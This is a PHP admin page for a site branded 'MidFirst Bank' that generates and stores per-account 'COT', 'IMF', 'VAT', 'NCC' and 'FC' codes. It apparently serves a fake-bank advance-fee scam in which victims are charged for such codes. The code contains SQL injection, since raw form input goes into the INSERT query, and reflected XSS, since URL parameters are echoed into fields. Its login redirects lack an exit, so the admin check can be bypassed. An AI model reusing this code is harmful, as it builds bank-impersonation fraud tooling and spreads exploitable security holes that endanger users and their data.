<?php require "../admin/database.php";

include('../functions.php');

if (!isAdmin()) {
	$_SESSION['msg'] = "You must log in first";
	header('location: ../login.php');
}

if (isset($_GET['logout'])) {
	session_destroy();
	unset($_SESSION['user']);
	header("location: ../login.php");
}

include_once 'database.php';
if(isset($_POST['generate']))
{
// variables for input data

$account = $_POST['account'];
$client = $_POST['client'];
$cot = $_POST['cot'];
$imf = $_POST['imf'];
$vat = $_POST['vat'];
$ncc = $_POST['ncc'];
$fc = $_POST['fc'];
// sql query for inserting data into database

mysqli_query($conn,"insert into codes(account,client,cot,imf,vat,ncc,fc) values ('$account','$client','$cot','$imf','$vat','$ncc','$fc')") or die(mysqli_error());
echo "<script>
alert('Code Generated');
window.location.href='codes.php';
</script>";
}
?>
<!DOCTYPE HTML>
<html lang="en-US" prefix="og: http://ogp.me/ns#">
    <head>
        <!-- Meta Tags -->
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"/>
	<meta name="HandheldFriendly" content="true" />
	<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
	<title>Generate Code | MidFirst Bank</title>
    <style>
body,html{margin:0;padding:0;background-color:#696969;}
            body{backgrond:#fff;max-width:750px;margin:auto;}
            .head{border-radius: 5px;box-shadow: 0px 1px 0px 1px #000;border-bottom:1px solid #000;background-color: #222;padding:10px;width:auto;}
            .foot{right:0; left: 0;
  bottom: 0;position: absolute;box-shadow: 2px 2px 0px 2px #000;border-bottom:1px solid #000;background-color: #222;padding:10px;width: 100%;}
            .button{background-color: #222;
  color: #696969;
  padding: 12px;
  border-radius: 5px;
  font-weight:bold;
  font-size:17px;
  border:1px solid #000;
  width: 100%;}
            .text{text-shadow: 0px 0px 2px #000;font-size:12px;margin:15px;color:#ffffff;font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;}
            .mtext{text-shadow: 1px 0px 2px #000;font-size:13px;margin:15px;color:#fff;font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;}
            .mybox{text-shadow: 0px 0px 2px #000;font-size:12px;margin:15px;padding:10px;border-radius:5px;border:1px solid #000;background-color:#ffffff;font-family:lato,sans-serif;}
            .input-group {
 margin: 5px 13px 5px 1px; } .input-group label { display: block;
 text-align: left; margin: 3px;} .input-group input { box-shadow: rgba(0,0,0,0.3) 0 0 10px;
 border-collapse: collapse; height: 25px;
 padding: 5px;
 width: 100%;
 font-size: 16px;
 border-radius: 5px; border: 1px solid #222; background:#fff;
 }
 .btn {
 padding: 10px;
 width:auto;
 font-size: 15px;
 color: #000;
 background: #696969;border-radius: 5px; }
</style>
</head>
<body>
<?php include('../header.php'); ?>

<div class="mybox">
    <div class="form-w3layouts">
    <?php if(isset($message)) { echo $message; } ?>
<form method="post" action="">
	<div class="input-group"> 
	<table cellspacing="0" cellpadding="0"><tbody><tr><td width="90%" align="center"><div style="border-radius:2px;border:2px solid brown; background-color: #222; background-repeat: no-repeat; background-align: center; color: #FFF; padding: 4px; font-weight: bolder; text-align: center;font-size: 13px;margin-left:1px;">ACCOUNT NO</div></td></tr></tbody></table>
						<input type="text" name="account" class="txtField" value="<?php echo $_GET['benaccnt']; ?>">
						<div class="clear"></div>
	</div>
	<div class="input-group"> 
	<table cellspacing="0" cellpadding="0"><tbody><tr><td width="90%" align="center"><div style="border-radius:2px;border:2px solid brown; background-color: #222; background-repeat: no-repeat; background-align: center; color: #FFF; padding: 4px; font-weight: bolder; text-align: center;font-size: 13px;margin-left:1px;">ACCOUNT NAME</div></td></tr></tbody></table>
						<input name="client" class="txtField" value="<?php echo $_GET['benname']; ?>">
						<div class="clear"></div>
	</div>
	<div class="input-group"> 
	<table cellspacing="0" cellpadding="0"><tbody><tr><td width="90%" align="center"><div style="border-radius:2px;border:2px solid brown; background-color: #222; background-repeat: no-repeat; background-align: center; color: #FFF; padding: 4px; font-weight: bolder; text-align: center;font-size: 13px;margin-left:1px;">COT CODE</div></td></tr></tbody></table>
						<input type="number" name="cot" class="txtField" value="">
						<div class="clear"></div>
	</div>
	<div class="input-group"> 
	<table cellspacing="0" cellpadding="0"><tbody><tr><td width="90%" align="center"><div style="border-radius:2px;border:2px solid brown; background-color: #222; background-repeat: no-repeat; background-align: center; color: #FFF; padding: 4px; font-weight: bolder; text-align: center;font-size: 13px;margin-left:1px;">IMF CODE</div></td></tr></tbody></table>
						<input type="number" name="imf" class="txtField" value="">
						<div class="clear"></div>
	</div>
	<div class="input-group"> 
	<table cellspacing="0" cellpadding="0"><tbody><tr><td width="90%" align="center"><div style="border-radius:2px;border:2px solid brown; background-color: #222; background-repeat: no-repeat; background-align: center; color: #FFF; padding: 4px; font-weight: bolder; text-align: center;font-size: 13px;margin-left:1px;">VAT CODE</div></td></tr></tbody></table>
						<input type="number" name="vat" class="txtField" value="">
						<div class="clear"></div>
	</div>
	<div class="input-group"> 
	<table cellspacing="0" cellpadding="0"><tbody><tr><td width="90%" align="center"><div style="border-radius:2px;border:2px solid brown; background-color: #222; background-repeat: no-repeat; background-align: center; color: #FFF; padding: 4px; font-weight: bolder; text-align: center;font-size: 13px;margin-left:1px;">NCC CODE</div></td></tr></tbody></table>
						<input type="number" name="ncc" class="txtField" value="">
						<div class="clear"></div>
	</div>
	<div class="input-group"> 
	<table cellspacing="0" cellpadding="0"><tbody><tr><td width="90%" align="center"><div style="border-radius:2px;border:2px solid brown; background-color: #222; background-repeat: no-repeat; background-align: center; color: #FFF; padding: 4px; font-weight: bolder; text-align: center;font-size: 13px;margin-left:1px;">FC CODE</div></td></tr></tbody></table>
						<input type="number" name="fc" class="txtField" value="">
						<div class="clear"></div>
	</div>
	<div align="left" class="form-control w3ls-end">
						<input name="generate" type="submit" class="btn" value="Generate">
						<div class="clear"></div>
	</div>
</form>
</div>
</div>
<?php include('../footer.php'); ?>